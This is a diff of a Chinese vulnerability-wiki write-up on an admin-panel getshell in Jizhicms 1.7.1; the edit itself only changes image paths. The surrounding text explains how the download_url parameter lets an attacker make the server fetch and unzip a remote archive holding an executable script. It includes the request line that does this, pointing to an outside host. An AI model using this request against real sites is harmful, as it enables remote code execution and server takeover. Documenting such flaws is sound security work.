@@ -28,7 +28,7 @@ Jizhicms 1.7.1
 
     action=start-download&filepath=msgphone&download_url=http://www.0-sec.org/test/a.zip
 
-攻击者可以控制download\_url传入参数的值，从而传入被压缩的可执行脚本，然后该压缩包会被解压并传入到特定位置，实现getshell所以只需要攻击者在自己控制的网站上压缩可执行脚本然后将url赋值给download\_url即可实现任意文件上传定位下函数位置，该函数位于/A/c/PluginsController.php下的update函数![1.png](/Users/aresx/Documents/VulWiki/.resource/Jizhicms1.7.1后台getshell/media/rId24.png)传进来的值通过frparam函数处理之后变赋值给了remote\_url跟进到frparam函数函数中，该函数位于/FrPHP/lib/Controller.php中
+攻击者可以控制download\_url传入参数的值，从而传入被压缩的可执行脚本，然后该压缩包会被解压并传入到特定位置，实现getshell所以只需要攻击者在自己控制的网站上压缩可执行脚本然后将url赋值给download\_url即可实现任意文件上传定位下函数位置，该函数位于/A/c/PluginsController.php下的update函数![1.png](./.resource/Jizhicms1.7.1后台getshell/media/rId24.png)传进来的值通过frparam函数处理之后变赋值给了remote\_url跟进到frparam函数函数中，该函数位于/FrPHP/lib/Controller.php中
 
     public function frparam($str=null, $int=0,$default = FALSE, $method = null){
 
@@ -56,7 +56,7 @@ Jizhicms 1.7.1
             return format_param($value,$int);
         }
 
-该函数并没有对传入的值进行过滤，只是简单的从data数组里取数据然后继续回到update函数，在获取到了remote\_url的值后便进行了下载以及解压缩的操作![2.png](/Users/aresx/Documents/VulWiki/.resource/Jizhicms1.7.1后台getshell/media/rId25.png)![3.png](/Users/aresx/Documents/VulWiki/.resource/Jizhicms1.7.1后台getshell/media/rId26.png)最后解压到的文件夹为/A/exts![4.png](/Users/aresx/Documents/VulWiki/.resource/Jizhicms1.7.1后台getshell/media/rId27.png)
+该函数并没有对传入的值进行过滤，只是简单的从data数组里取数据然后继续回到update函数，在获取到了remote\_url的值后便进行了下载以及解压缩的操作![2.png](./.resource/Jizhicms1.7.1后台getshell/media/rId25.png)![3.png](./.resource/Jizhicms1.7.1后台getshell/media/rId26.png)最后解压到的文件夹为/A/exts![4.png](./.resource/Jizhicms1.7.1后台getshell/media/rId27.png)
 
 参考链接
 --------
